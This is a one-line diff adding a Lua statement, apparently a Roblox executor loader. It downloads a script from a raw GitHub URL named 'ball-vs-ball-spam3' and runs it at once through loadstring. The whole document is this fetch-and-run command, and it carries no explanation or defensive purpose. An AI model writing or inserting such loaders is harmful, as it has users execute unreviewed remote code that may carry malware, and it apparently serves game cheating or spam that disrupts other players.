@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/ball-vs-ball-spam3-gqape6wjmdnekf.lua"))()
